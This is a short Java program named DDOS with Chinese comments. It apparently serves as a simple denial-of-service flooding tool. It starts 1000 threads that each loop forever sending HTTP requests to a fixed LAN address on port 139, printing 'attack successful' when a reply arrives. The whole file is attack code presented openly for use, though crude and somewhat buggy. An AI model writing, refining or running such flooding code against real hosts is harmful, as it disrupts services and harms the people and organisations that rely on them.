import java.io.BufferedInputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class DDOS {
	public static void main(String[] args) {
		// 利用线程池创建1000个线程
		ExecutorService es = Executors.newFixedThreadPool(1000);
		Mythread mythread = new Mythread();
		Thread thread = new Thread(mythread);
		for (int i = 0; i < 1000; i++) {
			es.execute(thread);
		}
	}
}

class Mythread implements Runnable {
	public void run() {
		while (true) {
			try {
				URL url = new URL("http://192.168.1.4:139/");
				URLConnection conn = url.openConnection();
				System.out.println("发包成功！");
				BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());
				byte[] bytes = new byte[1024];
				int len;
				StringBuffer sb = new StringBuffer();
				if (bis != null) {
					if ((len = bis.read()) != -1) {
						sb.append(new String(bytes, 0, len));
						System.out.println("攻击成功！");
						bis.close();
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
